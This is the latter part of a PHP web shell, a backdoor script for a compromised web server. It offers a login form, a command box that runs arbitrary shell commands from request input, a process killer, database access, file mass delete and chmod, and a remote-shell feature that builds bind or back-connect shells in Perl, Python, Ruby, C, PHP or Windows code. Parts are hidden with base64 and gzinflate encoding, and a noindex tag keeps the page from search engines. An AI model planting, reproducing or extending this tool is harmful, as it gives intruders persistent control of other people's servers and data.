				if($s_split[0]=="bind") $s_rstarget_packed = $s_rsport_;
				elseif($s_split[0]=="back") $s_rstarget_packed = $s_rsport_." ".$s_rshost_;

				if($s_split[1]=="pl") $s_rscode = $s_rs_pl;
				elseif($s_split[1]=="py") $s_rscode = $s_rs_py;
				elseif($s_split[1]=="rb") $s_rscode = $s_rs_rb;
				elseif($s_split[1]=="c") $s_rscode = $s_rs_c;
				elseif($s_split[1]=="win") $s_rscode = $s_rs_win;
				elseif($s_split[1]=="php") $s_rscode = $s_rs_php;;
				$s_buff = rs($s_rstype,$s_rstarget_packed,$s_rscode);
				if($s_buff!="") $s_rs_err = "<p class='notif'>".hss($s_buff)."</p>";
			}
			$s_result .= "<div class='mybox'><h2>".$s_rstitle."</h2>
			<form action='".$s_self."' method='post' />
			<table class='myboxtbl'>
			<tr><td style='width:100px;'>".$s_labelip."</td><td><input ".$s_rsdisabled." style='width:100%;' class='inputz' type='text' name='rshost_".$s_rstype."' value='".$s_rstarget."' /></td></tr>
			<tr><td>Port</td><td><input style='width:100%;' class='inputz' type='text' name='rsport_".$s_rstype."' value='".$s_rsport."' /></td></tr>
			</table>
			<input type='submit' name='".$s_rstype."' class='inputzbut' value='Go !' style='width:120px;height:30px;margin:10px 2px 0 2px;' />
			&nbsp;&nbsp;<span>".$s_rspesan."</span>
			<input type='hidden' name='x' value='rs' />
			</form>
			</div>";
		}
		$s_result = $s_rs_err.$s_result;
	} 
	
	//tentang
	elseif(isset($_REQUEST['x']) && ($_REQUEST['x']=='about')){
		$s_result .= "<div class='mybox'><h2>About of ".$s_name."</h2>
		<p>tentang shell<p>
		</div>";
	}

	// decode and endode
	elseif(isset($_REQUEST['x']) && ($_REQUEST['x']=='code')){
		$s_result .= "<div class='mybox'><h2>The Code of ".$s_name."</h2>
			<p>The decode and endode<p>
		</div>";
	}
	
	// task manager
	elseif(isset($_REQUEST['x']) && ($_REQUEST['x']=='ps')){
		$s_buff = "";
		// kill process specified by pid
		if(isset($_REQUEST['pid'])){
			$s_p = ss($_REQUEST['pid']);
			if(function_exists("posix_kill")) $s_buff = (posix_kill($s_p,'9'))? "Process with pid ".$s_p." has been successfully killed":"Unable to kill process with pid ".$s_p;
			else{
				if(!$s_win) $s_buff = exe("kill -9 ".$s_p);
				else $s_buff = exe("taskkill /F /PID ".$s_p);
			}
		}

		if(!$s_win) $s_h = "ps aux";
		else $s_h = "tasklist /V /FO csv";
		$s_wcount = 11;
		$s_wexplode = " ";
		if($s_win) $s_wexplode = "\",\"";

		$s_res = exe($s_h);
		if(trim($s_res)=='') $s_result = "<p class='notif'>Error getting process list</p>";
		else{
			if($s_buff!="") $s_result = "<p class='notif'>".$s_buff."</p>";
			$s_result .= "<table class='explore sortable'>";
			if(!$s_win) $s_res = preg_replace('#\ +#',' ',$s_res);

			$s_psarr = explode("\n",$s_res);
			$s_fi = true;
			$s_tblcount = 0;

			$s_check = explode($s_wexplode,$s_psarr[0]);
			$s_wcount = count($s_check);

			foreach($s_psarr as $s_psa){
				if(trim($s_psa)!=''){
					if($s_fi){
						$s_fi = false;
						$s_psln = explode($s_wexplode,$s_psa,$s_wcount);
						$s_result .= "<tr><th class='sorttable_nosort'>action</th>";
						foreach($s_psln as $s_p) $s_result .= "<th>".trim(trim(strtolower($s_p)),"\"")."</th>";
						$s_result .= "</tr>";
					}
					else{
						$s_psln = explode($s_wexplode,$s_psa,$s_wcount);
						$s_result .= "<tr>";
						$s_tblcount = 0;
						foreach($s_psln as $s_p){
							if(trim($s_p)=="") $s_p = "&nbsp;";
							if($s_tblcount == 0){
								$s_result .= "<td style='text-align:center;'><a href='".$s_self."x=ps&pid=".trim(trim($s_psln[1]),"\"")."' onclick='return false;'>kill</a></td>
										<td style='text-align:center;'>".trim(trim($s_p),"\"")."</td>";
								$s_tblcount++;
							}
							else{
								$s_tblcount++;
								if($s_tblcount == count($s_psln)) $s_result .= "<td style='text-align:left;'>".trim(trim($s_p),"\"")."</td>";
								else $s_result .= "<td style='text-align:center;'>".trim(trim($s_p),"\"")."</td>";
							}
						}
						$s_result .= "</tr>";
					}
				}
			}
			$s_result .= "</table>";
		}
	}
	
	else{
		if(isset($_REQUEST['cmd'])){
			$s_cmd = ss($_REQUEST['cmd']);
			if(strlen($s_cmd) > 0){
				if(preg_match('#^cd(\ )+(.*)$s_#',$s_cmd,$s_r)){
					$s_nd = trim($s_r[2]);
					if(is_dir($s_nd)){
						chdir($s_nd);
						$s_cwd = cp(getcwd());
						$s_result .= showdir($s_cwd);
					}
					elseif(is_dir($s_cwd.$s_nd)){
						chdir($s_cwd.$s_nd);
						$s_cwd = cp(getcwd());
						$s_result .= showdir($s_cwd);
					}
					else $s_result .= "<p class='notif'>".$s_nd." is not a directory"."</p>";
				}
				else{
					$s_r = hss(exe($s_cmd));
					if($s_r != '') $s_result .= "<pre>".$s_r."</pre>";
					else $s_result .= showdir($s_cwd);
				}
			}
			else $s_result .= showdir($s_cwd);
		}
		else{
			$s_result .= showdir($s_cwd);
		}
	}

	
	// print useful info
	$s_info  = "<table class='headtbl'><tr><td>".$s_system."</td></tr>";
	$s_info .= "<tr><td>".$s_software."</td></tr>";
	$s_info .= "<tr><td>server ip : ".$s_server_ip."<span class='gaya'> | </span>your   ip : ".$s_my_ip;
	$s_info .= "<span class='gaya'> | </span> Time @ Server : ".@date("d M Y H:i:s",time());
	$s_info .= "
		</td></tr>
		<tr><td style='text-align:left;'>
			<table class='headtbls'><tr>
			<td>".trim($s_letters)."</td>
			<td>
			<span id='chpwd'>
			&nbsp;<a href=\"javascript:tukar('chpwd','chpwdform')\">
			<img height='16px' width='16px' src='".$s_favicode."' alt='Change' style='vertical-align:middle;margin:6px 0;border:0;' />
			&nbsp;&nbsp;</a>".swd($s_cwd)."</span>
			<form action='".$s_self."' method='post' style='margin:0;padding:0;'>
			<span class='sembunyi' id='chpwdform'>
			&nbsp;<a href=\"javascript:tukar('chpwdform','chpwd');\">
			<img height='16px' width='16px' src='".$s_favicode."' alt='Change' style='vertical-align:middle;margin:6px 0;border:0;' />
			</a>&nbsp;&nbsp;
			<input type='hidden' name='cd' class='inputz' style='width:300px;' value='".cp($s_cwd)."' />
			<input type='text' name='view' class='inputz' style='width:300px;' value='".$s_cwd."' />
			<input class='inputzbut' type='submit' name='submit' value='view file / folder' />
			</form>
			</span>
			</td></tr>
			</table>
		</td></tr>
		</table>";


}
?><!DOCTYPE html>
<html>
<head>
<title><?php echo $s_title; ?></title>
<meta name='robots' content='noindex, nofollow, noarchive'>
<link rel='shortcut icon' href='<?php echo $s_favicon; ?>'>
<link href='http://fonts.googleapis.com/css?family=Ubuntu+Mono:400,700' rel='stylesheet' type='text/css'>
<style type='text/css'>
<?php
	$s_css = gzinflate(base64_decode($s_style));
	$s_css = str_replace('fgcolor',$s_color,$s_css);
	echo $s_css;
?>.css-label{background-image:url(<?php echo $s_checkbox_img; ?>);}
</style>
</head>
<body>
<table id='main'>
<tr>
<td>
<?php if($s_auth){?>
	<div>
	<span class='headinfo' ><?php echo $s_info; ?></span>
	</div>
	<form method='post' name='g'></form>
	<div id='menu'>
		<table style='width:100%;'>
		<tr>
		<td style='width:100%;padding:0 0 0 6px;'>
		<form action='<?php echo $s_self; ?>' method='post'><span class='prompt'><?php echo $s_prompt; ?></span>
		<input id='cmd' onclick="clickcmd();" class='inputz' type='text' name='cmd' style='width:90%;' value='<?php if(isset($_REQUEST['cmd'])) echo ""; else echo "- shell command -";?>' placeholder='- shell command -'/>
		<noscript><input class='inputzbut' type='submit' value='Go !' name='submitcmd' style='width:80px;' /></noscript>
		</form>
		</td>
		</tr>
		</table>
	</div>	
	<div id='menu'>
		<table style='width:100%;'>
		<tr>
		<td><a href='<?php echo $s_self."cd=".cp(dirname(realpath($_SERVER['SCRIPT_FILENAME']))); ?>' title='Home Current' onclick='return false;'><div class='menumi'>Home</div></a></td>
		<td><a href='<?php echo $s_self; ?>x=info' title='Information about server' onclick='return false;'><div class='menumi'>Information</div></a></td>
		<td><a href='<?php echo $s_self; ?>x=ps' title='Display process status' onclick='return false;'><div class='menumi'>Process</div></a></td>
		<td><a href='<?php echo $s_self; ?>x=eval' title='Execute code' onclick='return false;'><div class='menumi'>Execute</div></a></td>
		<td><a href='<?php echo $s_self; ?>x=rs' title='Remote Shell' onclick='return false;'><div class='menumi'>Remote</div></a></td>
		<td><a href='<?php echo $s_self; ?>x=logout' title='Logout' onclick='return false;'><div class='menumi'>Logout</div></a></td>
		<td><a href='<?php echo $s_self; ?>x=db' title='Connect to database' onclick='return false;'><div class='menumi'>Connect</div></a></td>
		<td><a href='<?php echo $s_self; ?>x=about' title='About Of Shell' onclick='return false;'><div class='menumi'>About</div></a></td>
		<td><a href='<?php echo $s_self; ?>x=code' title='Encode and Decode' onclick='return false;'><div class='menumi'>Code</div></a></td>
		<td><a href='<?php echo $s_self; ?>' title='Explorer' onclick='return false;'><div class='menumi'>Explorer</div></a></td>
		</tr>
		</table>
	</div>
	<div id='content' id='box_shell'>
		<div id='result'><?php echo $s_result; ?></div>
	</div><?php }
else{ ?>
	</td></tr></table></body>
	<div style='width:100%;text-align:right;'>
	<form action='<?php echo $s_self; ?>' method='post'>
	<img src='<?php echo $s_favicon; ?>' style='margin:2px;vertical-align:middle;' />
	<input id='login' class='inputz' type='password' name='login' style='width:120px;' value='' />
	</form>
	</div>
<?php } ?>
<script type='text/javascript'><?php echo gzinflate(base64_decode($s_sortable_js)); ?></script>
<script type='text/javascript'>
var d = document;
var hexstatus = false;
window.onload=function(){
	<?php if(isset($_REQUEST['cmd'])) echo "if(d.getElementById('cmd')) d.getElementById('cmd').focus();"; ?>
	<?php if(isset($_REQUEST['evalcode'])) echo "if(d.getElementById('evalcode')) d.getElementById('evalcode').focus();"; ?>
	<?php if(isset($_REQUEST['sqlcode'])) echo "if(d.getElementById('sqlcode')) d.getElementById('sqlcode').focus();"; ?>
	<?php if(isset($_REQUEST['login'])) echo "if(d.getElementById('login')) d.getElementById('login').focus();"; ?>

	var textareas = d.getElementsByTagName('textarea');
	var count = textareas.length;
	for(i=0;i<count;i++){
		textareas[i].onkeydown = function(e){
			if(e.keyCode==9){
				e.preventDefault();
				var s = this.selectionStart;
				this.value = this.value.substring(0,this.selectionStart) + "\t" + this.value.substring(this.selectionEnd);
				this.selectionEnd = s+1;
			}
			else if(e.ctrlKey && (e.keyCode == 10 || e.keyCode == 13)){
				this.form.submit();
			}
		}
	}
	listen();
}
function listen(){
	x = d.getElementsByTagName("a");
	for(i=0;i<x.length;i++){
		if(x[i].addEventListener) x[i].addEventListener ("mousedown", function(event){return go(this.href,event);},false);
		else x[i].attachEvent ("onmousedown", function(event){return go(this.href,event);});
	}
}
function go(t,evt){
	if(evt.which === 3 || evt.button === 2) return false;

	ts = t.split('?');
	if(ts.length == 2){
		var a = ts[0];
		var v = ts[1];
		var vs = v.split('&');
		var g = d.forms['g'];

		if(a=='') a='?';
		g.action = a;
		for(var i=0;i<vs.length;i++){
			var vss = vs[i].split('=');
			if(vss.length == 2){
				addinput(g,vss[0],vss[1]);
			}
		}
		g.submit();
	}
	else window.location = t;
	return false;
}
function tukar(l,b){
	if(d.getElementById(l)) d.getElementById(l).style.display = 'none';
	if(d.getElementById(b)) d.getElementById(b).style.display = 'block';
	if(d.getElementById(l + '_')) d.getElementById(l + '_').focus();
}
function toggle(b){
	if(d.getElementById(b)){
		if(d.getElementById(b).style.display == 'block') d.getElementById(b).style.display = 'none';
		else d.getElementById(b).style.display = 'block'
	}
}
function addinput(f,k,v){
	var i = d.createElement('input');
	i.type = 'hidden';
	i.name = k;
	i.value = v;
	f.appendChild(i);
}
function clickcmd(){
	var buff = d.getElementById('cmd');
	if(buff.value == '- shell command -') buff.value = '';
}
function download(what){
	what.form.submit();what.selectedIndex=0;
}
function hexfix(t,ev){
	var r = d.getElementById('hex_'+t);
	var q = d.getElementById('dump_'+t);
	var curpos = getcurpos(r);

	if(ev.keyCode==13 || ev.keyCode==46 || ev.keyCode==8 || ev.keyCode==32)	return false;
	//down
	if(ev.keyCode==40){
		var s = d.getElementById('hex_'+(parseInt(t)+1));
		if(s){clearpos();s.focus();setcurpos(s,curpos,curpos);}
		return false;
	}//up
	if(ev.keyCode==38){
		var s = d.getElementById('hex_'+(parseInt(t)-1));
		if(s){clearpos();s.focus();setcurpos(s,curpos,curpos);}
		return false;
	}
}
function hexupdate(t,ev){
	var r = d.getElementById('hex_'+t);
	var s = d.getElementById('dump_'+t);
	var k = String.fromCharCode(ev.keyCode);
	var a = '0123456789ABCDEF';
	var hexs = r.value;
	var hex = hexs.replace(/\s+/ig,'');
	var curpos = getcurpos(r);

	clearpos();
	if(curpos%3!=2){
		if(a.indexOf(k)>=0 && curpos<hexs.length){
			chr = hexs.substr(curpos,1);
			before = (curpos>=1)?  hexs.substr(0,curpos):'';
			after = (curpos<hexs.length)? hexs.substr(curpos+1):'';
			r.value = before + k + after;
			setcurpos(r,curpos+1,curpos+1);
		}
	}
	if(r && s){
		var str = '';
		hexs = r.value;
		hex = hexs.replace(/\s+/ig,'');
		for(var i=0;i<hex.length;i+=2) str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));

		str = str.replace(/[^\x21-\x7E]/ig,'.');
		str = str.replace(/</ig,'.')
		str = str.replace(/>/ig,'.')

		dmppos = Math.floor(curpos/3);
		chr = str.substr(dmppos,1);
		before = (dmppos>=1)? str.substr(0,dmppos):'';
		after = (dmppos<str.length)? str.substr(dmppos+1):'';
		finalstr = before + "<span class='gaya' style='background:#000;font-weight:bold;border-bottom:1px solid #fff;border-top:1px solid #fff;'>" + chr + "</span>" + after;
		s.innerHTML = finalstr;
	}
}
function submithex(){
	if(!hexstatus){
		hexstatus=true;
		var hexstr = '';
		var counter = d.getElementById('counter').value;
		for(var i=0;i<counter;i++){
			var hex = d.getElementById('hex_'+i);
			hexstr+=hex.value;
			hex.remove();
		}
		hexstr = hexstr.replace(/\s+/g,'');
		var hexestxtarea = d.getElementById('hexestxtarea');
		hexestxtarea.innerHTML = hexstr;
		hexestxtarea.form.submit();
	}
}
function evalselect(e){
	var a = d.getElementById('additionaloption');
	var b = d.getElementById('gccoption');
	if(a){
		if(e.value=='php') a.className='sembunyi';
		else a.className='';
		if(b) gccoption.value ='';
	}
}
function getcurpos(c){
    var p = 0;
    if(d.selection){
        c.focus ();
        var Sel = d.selection.createRange();
        Sel.moveStart ('character', c.value.length);
        p = Sel.text.length;
    }
    else if(c.selectionStart || c.selectionStart == '0')
        p = c.selectionStart;
    return p;
}
function setcurpos(c,p1,p2){
	if(c.setSelectionRange){
		c.focus();
		c.setSelectionRange(p1,p2);
	}
	else if(c.createTextRange){
		var r = c.createTextRange();
		r.collapse(true);
		r.moveStart('character', p1);
		r.moveEnd('character', p2);
		r.select();
	}
}
function clearpos(){
	var a = d.getElementsByName('hexdump');
	for(var i=0;i<a.length;i++){
		a[i].innerHTML = a[i].innerHTML.replace(/<[^>]+>/ig,'');
	}
}
function findtype(ty){
	var z = d.getElementById('type');
	if(z && (ty=='sdir')) z.selectedIndex = 1;
	else if(z && (ty=='sfile')) z.selectedIndex = 0;
}
function checkall(){
	var a = d.getElementsByName('cbox');
	var b = d.getElementsByName('abox');
	for(var i=0;i<a.length;i++){
		a[i].checked = b[0].checked;
		var bgcolor = '#111111';
		if(a[i].checked) bgcolor = '#202020';
		a[i].parentElement.parentElement.style.backgroundColor=bgcolor;
	}
}
function hilite(el){
	var bgcolor = '#111111';
	if(el.checked) bgcolor = '#202020';
	el.parentElement.parentElement.style.backgroundColor=bgcolor;
}
function massactgo(){
	var a = d.getElementsByName('cbox');
	var b = d.getElementById('massact');
	var c = d.getElementsByName('abox');
	var buffer = '';

	if(b.value=='cut' || b.value=='copy'){
		d.cookie='massact='+b.value+';';
		for(var i=0;i<a.length;i++) if(a[i].checked) buffer += a[i].value+'|';
		d.cookie='buffer='+escape(buffer);
	}
	else if(b.value=='paste'){
		addinput(b.form,'y','paste');
		b.form.submit();
	}
	else if(b.value=='delete' || b.value=='chmod' || b.value=='touch'){
		for(var i=0;i<a.length;i++) if(a[i].checked) buffer += a[i].value+'|';
		d.cookie='buffer='+escape(buffer);
		addinput(b.form,'y', b.value);
		b.form.submit();
	}
	for(var i=0;i<a.length;i++){
		a[i].checked = false;
		a[i].parentElement.parentElement.style.backgroundColor='#111111';
	}
	c[0].checked = false;
}
</script>
</html><?php 
die(); 
?>
